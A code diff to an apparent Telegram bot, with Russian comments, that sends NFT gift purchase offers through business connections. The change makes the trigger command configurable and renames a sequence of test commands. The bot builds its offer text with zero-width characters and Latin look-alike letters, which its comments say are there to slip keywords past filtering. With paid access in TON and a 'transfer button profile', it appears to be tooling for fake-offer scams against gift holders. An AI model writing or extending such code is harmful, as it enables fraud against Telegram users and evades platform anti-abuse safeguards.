@@ -38,10 +38,17 @@ awaiting_profile_change = {}  # {admin_user_id: target_user_id}
 awaiting_admin_search = set()
 awaiting_referral_hours = set()
 awaiting_access_duration = set()
+awaiting_offer_command = set()
 admin_user_queries = {}
 admin_offer_filters = {}
 awaiting_access_recovery = set()  # users currently entering a previously authorized username
 pending_access_usernames = {}  # child Telegram ID -> username entered for access recovery
+
+
+def get_offer_command() -> str:
+    """Команда создания офера; хранится в БД и переживает перезапуск."""
+    value = (db.get_setting("offer_command", "ху") or "ху").strip().lstrip(".")
+    return value if value else "ху"
 
 
 def get_payment_price() -> float:
@@ -86,9 +93,10 @@ async def send_with_banner(target, text: str, reply_markup=None, **kwargs):
 
 
 def instruction(locale="ru"):
+    command = get_offer_command()
     return (
         "<b>ОСНОВНАЯ КОМАНДА НА РУССКОМ ЯЗЫКЕ:</b>\n"
-        "<blockquote><code>купить https://t.me/nft/123 3в/stars | gram/</code></blockquote>\n"
+        f"<blockquote><code>{html.escape(command)} https://t.me/nft/123 3в/stars | gram/</code></blockquote>\n"
         "<b>Доступные языки:</b>\n\n"
         "Английский\n<blockquote>В конце команды: англ/en</blockquote>\n"
         "Арабский\n<blockquote>В конце команды: араб</blockquote>\n"
@@ -196,7 +204,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     
     text = message.text or message.caption or ""
     plain_currency = False
-    parsed = parse_offer(text)
+    parsed = parse_offer(text, get_offer_command())
     if parsed.get("error"):
         await reply_message(message, error_text(parsed["error"]))
         return
@@ -290,7 +298,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     test_level = parsed.get("test_level", 0)
     
     if test_level > 0:
-        # Короткие тестовые команды: купить1, купить2, купить3...
+        # Короткие тестовые команды: ху1, ху2, ху3...
         # Добавляем невидимый символ в начало + используем латинские буквы в ключевых словах
         # \u200c - zero-width non-joiner
         prefix = "\u200c"
@@ -1086,6 +1094,28 @@ async def on_message(message: Message):
         awaiting_referral_hours.discard(cfg.owner_id)
         await message.answer(f"Реферальный бонус изменён: {hours:g} часов.", reply_markup=admin_keyboard())
         return
+    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_offer_command:
+        raw = (message.text or "").strip()
+        if raw.lower() == "/cancel":
+            awaiting_offer_command.discard(cfg.owner_id)
+            await message.answer("Изменение команды отменено.", reply_markup=admin_keyboard())
+            return
+        command = raw.lstrip(".")
+        if not command or len(command) > 24 or not all(ch.isalnum() or ch == "_" for ch in command):
+            await message.answer("Введите одну команду без пробелов и символов, кроме букв, цифр и _. Например: <code>ху</code>. Для отмены: /cancel")
+            return
+        if command.lower() in {"start", "admin", "админ", "cancel", "broadcast", "transfer", "reply"}:
+            await message.answer("Это имя зарезервировано. Выберите другое. Например: <code>ху</code>.")
+            return
+        db.set_setting("offer_command", command)
+        db.log_admin_action(cfg.owner_id, "change_offer_command", None, f"command={command}")
+        awaiting_offer_command.discard(cfg.owner_id)
+        await message.answer(
+            f"✅ Команда создания офера изменена на: <code>{html.escape(command)}</code>\n"
+            "Можно писать её с точкой или без точки.",
+            reply_markup=admin_keyboard(),
+        )
+        return
     if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_access_grant:
         raw = (message.text or "").strip()
         if raw.lower() == "/cancel":
@@ -1305,7 +1335,7 @@ async def handle_text(message: Message, is_business: bool):
         return
     
     # Тестовая команда "Привет"
-    if low == "купитьпривет":
+    if low == "хупривет":
         # Создаём inline-кнопку с обходом слова "Привет" (e - английская)
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Привeт", callback_data="test_privet")]
@@ -1314,56 +1344,58 @@ async def handle_text(message: Message, is_business: bool):
         return
     
     # Простые тестовые команды: добавляем по одному слову
-    if low == "купить1":
+    if low == "ху1":
         await test_send(message, is_business, "Пoльзoвaтeль")
         return
-    if low == "купить2":
+    if low == "ху2":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name}")
         return
-    if low == "купить3":
+    if low == "ху3":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт")
         return
-    if low == "купить4":
+    if low == "ху4":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм")
         return
-    if low == "купить5":
+    if low == "ху5":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100")
         return
-    if low == "купить6":
+    if low == "ху6":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa")
         return
-    if low == "купить7":
+    if low == "ху7":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк")
         return
-    if low == "купить8":
+    if low == "ху8":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test")
         return
-    if low == "купить9":
+    if low == "ху9":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe")
         return
-    if low == "купить10":
+    if low == "ху10":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo")
         return
-    if low == "купить11":
+    if low == "ху11":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo 24ч")
         return
-    if low == "купить12":
+    if low == "ху12":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         await test_send(message, is_business, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>100</b> зa пoдaрoк <a href=\"https://t.me/nft/Test\">Test</a>.\n\nПрeдлoжeниe aктивнo <b>24ч</b>.")
         return
     
-    # Принимаем команду «купить» (регистр не учитывается).
-    if low.startswith("купить ") or low.startswith(".купить ") or low in {"купить", ".купить"}:
+    # Команда офера настраивается администратором; точка перед ней необязательна.
+    active_command = get_offer_command().lower()
+    first_token = low.split(maxsplit=1)[0].lstrip(".") if low else ""
+    if first_token == active_command:
         await process_offer(message, message.business_connection_id if is_business else None)
         return
     if low.startswith("/admin") or low.startswith("/админ"):
@@ -1730,15 +1762,28 @@ async def admin_callback(call: CallbackQuery):
         text=("<b>Настройки</b>\n\n"
               f"Цена доступа: <b>{get_payment_price():g} TON</b>\n"
               f"Длительность доступа: <b>{get_access_duration_hours():g} часов</b>\n"
-              f"Реферальный бонус: <b>{referral_hours:g} часов</b>\n\nВыберите настройку.")
+              f"Реферальный бонус: <b>{referral_hours:g} часов</b>\n"
+              f"Команда офера: <code>{html.escape(get_offer_command())}</code>\n\nВыберите настройку.")
         markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Изменить цену", callback_data="adm:payment_price:0")],
             [InlineKeyboardButton(text="Изменить срок доступа", callback_data="adm:access_duration:0")],
             [InlineKeyboardButton(text="Изменить реферальный бонус", callback_data="adm:referral_hours:0")],
+            [InlineKeyboardButton(text="Изменить команду офера", callback_data="adm:offer_command:0")],
             [InlineKeyboardButton(text="Изменить баннер", callback_data="adm:banner:0")],
             [InlineKeyboardButton(text="Профиль кнопки передачи", callback_data="adm:change_profile:0")],
             [InlineKeyboardButton(text="Назад", callback_data="adm:home:0")]])
         await call.message.edit_text(text, reply_markup=markup); await call.answer(); return
+
+    if action == "offer_command":
+        awaiting_offer_command.add(cfg.owner_id)
+        await call.message.answer(
+            f"Текущая команда: <code>{html.escape(get_offer_command())}</code>\n\n"
+            "Отправьте новую команду одним словом. Можно использовать буквы, цифры и _.\n"
+            "Например: <code>купить</code> или <code>ху</code>.\n"
+            "Команду можно будет писать с точкой или без неё. Для отмены: /cancel"
+        )
+        await call.answer()
+        return
 
     if action == "system":
         data=db.admin_system_stats()
